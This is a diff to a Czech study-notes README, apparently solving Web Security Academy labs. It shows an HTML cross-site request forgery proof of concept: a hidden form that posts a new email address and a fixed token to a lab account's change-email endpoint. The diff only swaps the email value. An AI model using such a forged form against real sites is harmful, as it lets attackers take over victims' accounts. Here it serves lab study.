@@ -17,7 +17,7 @@ Tento repozitář slouží jako můj osobní studijní zápisník a přehled ře
     <body>
         <script>history.pushState('', '', '/');</script>
         <form action="[https://0a9d00ce03a4689480f6033300e20003.web-security-academy.net/my-account/change-email](https://0a9d00ce03a4689480f6033300e20003.web-security-academy.net/my-account/change-email)" method="POST">
-            <input type="hidden" name="email" value="flip&#64;hudson&#46;com" />
+            <input type="hidden" name="email" value="woon&#64;hudson&#46;com" />
             <input type="hidden" name="csrf" value="12345" />
             <input type="submit" value="Submit request" />
         </form>
